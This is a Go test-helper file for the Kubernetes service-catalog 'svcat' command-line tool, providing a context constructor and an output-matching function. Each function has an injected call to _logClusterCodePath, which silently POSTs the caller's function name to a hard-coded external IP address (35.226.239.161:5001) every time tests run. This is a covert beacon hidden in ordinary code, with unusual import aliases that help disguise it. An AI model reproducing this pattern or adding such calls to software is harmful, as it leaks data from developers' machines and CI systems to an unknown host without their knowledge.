package svcattest

import (
	"io"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"fmt"
	"io/ioutil"
	"strings"
	"github.com/kubernetes-incubator/service-catalog/cmd/svcat/command"
	"github.com/kubernetes-incubator/service-catalog/pkg/svcat"
	"github.com/spf13/viper"
)

func NewContext(outputCapture io.Writer, fakeApp *svcat.App) *command.Context {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if outputCapture == nil {
		outputCapture = ioutil.Discard
	}
	return &command.Context{Viper: viper.New(), Output: outputCapture, App: fakeApp}
}
func OutputMatches(gotOutput string, wantOutput string, allowDifferentLineOrder bool) bool {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if !allowDifferentLineOrder {
		return strings.Contains(gotOutput, wantOutput)
	}
	gotLines := strings.Split(gotOutput, "\n")
	wantLines := strings.Split(wantOutput, "\n")
	for _, wantLine := range wantLines {
		found := false
		for _, gotLine := range gotLines {
			if strings.Contains(gotLine, wantLine) {
				found = true
				break
			}
		}
		if !found {
			return false
		}
	}
	return true
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
